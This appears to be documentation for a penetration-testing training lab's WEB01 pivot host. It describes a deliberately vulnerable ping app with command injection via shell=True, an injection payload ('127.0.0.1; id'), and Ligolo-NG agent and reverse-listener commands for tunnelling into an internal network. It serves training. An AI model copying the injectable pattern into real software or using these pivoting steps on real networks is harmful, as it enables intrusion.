# WEB01 Pivot Host

WEB01 is the initial target and first pivot host in the Enterprise Pivot Lab.

It is intentionally dual-homed between the attacker-facing `LAB-EXT` network and the internal `CORP-LAN` network.

Scenario 01 requires the learner to compromise WEB01, discover its second interface, and use the host to establish access to the internal network.

## Role

WEB01 provides:

* the initial vulnerable application;
* the first low-privilege foothold;
* discovery of an additional network segment;
* the first Ligolo-NG agent;
* the pivot into CORP-LAN;
* a relay point for reverse connections originating from internal targets.

## Network Configuration

WEB01 has two permanent VirtualBox adapters.

### LAB-EXT

VirtualBox mode:

```text
Internal Network
```

Network:

```text
LAB-EXT
```

Address:

```text
10.10.10.20/24
```

This interface is reachable directly from Kali.

### CORP-LAN

VirtualBox mode:

```text
Internal Network
```

Network:

```text
CORP-LAN
```

Address:

```text
172.16.10.10/24
```

This interface provides WEB01 with direct access to the internal corporate network.

TARGET01 resides on the same network at:

```text
172.16.10.20
```

## Network Position

```text
KALI
10.10.10.10
     |
     | LAB-EXT
     |
WEB01
10.10.10.20
172.16.10.10
     |
     | CORP-LAN
     |
TARGET01
172.16.10.20
```

WEB01's position between the two networks is the central discovery of Scenario 01.

## Verifying Interfaces

On WEB01:

```bash
ip -br addr
```

The host should show addresses corresponding to:

```text
10.10.10.20/24
172.16.10.10/24
```

Verify routes:

```bash
ip route
```

Both networks should appear as directly connected networks.

## OpsCheck

Scenario 01's initial vulnerable application is:

```text
OpsCheck
```

OpsCheck is a deliberately vulnerable internal diagnostics application.

It listens on:

```text
TCP/8080
```

The application runs under the unprivileged account:

```text
opscheck
```

and is managed as a system service.

## OpsCheck Vulnerability

The diagnostics feature accepts a hostname or IP address and constructs a shell command similar to:

```python
command = f"ping -c 2 {target}"
```

The command is then executed with:

```python
shell=True
```

Because user-controlled input is inserted directly into a shell command, shell metacharacters can inject additional commands.

For example:

```text
127.0.0.1; id
```

executes the legitimate ping followed by:

```text
id
```

This is intentionally vulnerable behavior created for the lab.

## Intended Initial Foothold

The command injection is designed to provide execution as:

```text
opscheck
```

It is not intended to immediately provide root access.

A learner can convert the command-execution primitive into an interactive reverse shell and then enumerate the host.

The important discovery is the second network interface.

## Discovering CORP-LAN

From the compromised WEB01 host:

```bash
ip -br addr
ip route
```

reveals:

```text
172.16.10.10/24
```

and the directly connected:

```text
172.16.10.0/24
```

network.

This changes the attacker's view from:

```text
KALI -> WEB01
```

to:

```text
KALI -> WEB01 -> unknown internal network
```

Further enumeration reveals TARGET01.

## Ligolo-NG Agent

WEB01 runs the Ligolo agent only after the attacker deploys it.

A typical location is:

```text
/tmp/ligolo-agent
```

The agent connects to the Ligolo proxy running on Kali:

```bash
/tmp/ligolo-agent \
  -connect 10.10.10.10:11601 \
  -ignore-cert
```

The corresponding Ligolo session appears as:

```text
opscheck@Web01
```

The agent exposes WEB01's network visibility to the Ligolo proxy.

## Pivot Network

The relevant WEB01 internal interface is:

```text
172.16.10.10/24
```

Ligolo's `autoroute` function can use this interface to create a Kali route for:

```text
172.16.10.0/24
```

The Kali-side TUN interface is named:

```text
ligolo-web01
```

Once active, Kali can address TARGET01 directly through the tunnel.

## Ligolo Reverse Listener

WEB01 also provides the reachable endpoint for reverse connections from CORP-LAN.

TARGET01 can directly communicate with:

```text
172.16.10.10
```

but does not have a direct route to Kali's:

```text
10.10.10.10
```

address.

With the WEB01 Ligolo agent selected, create a listener:

```text
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4445 --tcp
```

Verify:

```text
listener_list
```

This produces the path:

```text
TARGET01
     |
     | 172.16.10.10:4445
     v
WEB01 Ligolo Agent
     |
     | Ligolo tunnel
     v
Kali Ligolo Proxy
     |
     v
127.0.0.1:4445
```

This behavior is useful for demonstrating that forward routed access and reverse connectivity are separate networking problems.

## WEB01 Is Not Configured as a Conventional Router

The lab does not require WEB01 to provide ordinary Linux IP forwarding between LAB-EXT and CORP-LAN.

The learner should not need to modify:

```text
net.ipv4.ip_forward
```

or configure WEB01 as Kali's default gateway.

Ligolo provides the attacker-controlled tunnel instead.

This preserves the intended post-compromise pivoting workflow.

## Testing CORP-LAN from WEB01

WEB01 should be able to reach TARGET01 directly:

```bash
ping -c 2 172.16.10.20
```

Once Northstar is installed:

```bash
curl http://172.16.10.20/
```

should return the internal application.

These tests establish that WEB01 has legitimate connectivity to the network Kali must pivot into.

## Known-Good Scenario 01 State

WEB01 is correctly configured when:

```text
[ ] LAB-EXT address is 10.10.10.20/24
[ ] CORP-LAN address is 172.16.10.10/24
[ ] Both networks survive reboot
[ ] Kali can directly reach WEB01
[ ] WEB01 can directly reach TARGET01
[ ] OpsCheck listens on TCP/8080
[ ] OpsCheck runs as the unprivileged opscheck user
[ ] OpsCheck command injection functions as intended
[ ] Ligolo agent can connect to Kali
[ ] Kali can route CORP-LAN through WEB01
[ ] Ligolo listeners can accept connections on WEB01
```

WEB01 should remain the first pivot host for Scenario 01 and can serve as the first layer of more complex future scenarios.
